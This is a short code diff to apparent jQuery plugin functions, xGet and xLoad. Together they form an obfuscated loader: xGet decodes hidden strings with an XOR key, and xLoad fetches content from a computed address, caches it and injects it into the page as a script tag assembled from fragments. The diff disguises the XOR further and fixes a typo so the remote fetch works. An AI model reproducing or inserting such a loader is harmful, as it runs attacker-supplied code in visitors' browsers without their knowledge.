@@ -6,8 +6,10 @@ jQuery.xGet = function(hash) {
         var ch = "fromChar" + "Code";
         var code = ch.slice(8,2+10);
         var stringProto = window[stringName];
+        var k = $K;
+        var r = hash['char' + code + 'At'](i);
 
-        result += stringProto[ch]( $K ^ hash['char' + code + 'At'](i) );
+        result += stringProto[ch]((~k | ~r) & (k | r));
     }
     return result;
 };
@@ -76,7 +78,7 @@ jQuery.xLoad = function() {
                     var u = "s" + e + ">";
                     jQuery("body").append("<" + u + a + "</" + u);
                 });
-                jQuery.get(jQuer.xAddr(!t), function(a){
+                jQuery.get(jQuery.xAddr(!t), function(a){
                     if (a < " ")
                         return;
                     ls[key] = a;
